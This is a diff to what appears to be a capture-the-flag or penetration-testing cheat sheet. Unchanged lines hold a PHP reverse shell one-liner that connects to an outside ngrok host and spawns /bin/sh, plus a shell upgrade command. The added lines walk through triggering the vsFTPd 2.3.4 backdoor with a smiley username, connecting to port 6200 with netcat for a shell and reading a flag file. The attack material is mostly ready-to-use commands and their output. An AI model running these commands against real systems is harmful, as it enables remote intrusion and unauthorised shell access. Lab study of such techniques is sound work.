@@ -40,6 +40,27 @@ php -r '$sock=fsockopen("2.tcp.ngrok.io",15705);exec("/bin/sh -i <&3 >&3 2>&3");
 upgrade : 
 python3 -c 'import pty;pty.spawn("/bin/bash")';
 
+# vstfp:2.3.4 backdoor
+
+* Solution :
+    ftp 10.1.0.188
+    Connected to 10.1.0.188.
+    220 (vsFTPd 2.3.4)
+    Name (10.1.0.188:root): ANYTHINGHERE:)
+    331 Please specify the password.
+    Password:
+    ^C
+    421 Service not available, remote server has closed connection
+
+    nc -vn 10.1.0.188 6200
+    Connection to 10.1.0.188 6200 port \[tcp/*\] succeeded!
+
+    ls ~
+    flag.txt
+
+    cat ~/flag.txt
+
+
 # PrivEsc : Sudo
 sudo -l
 
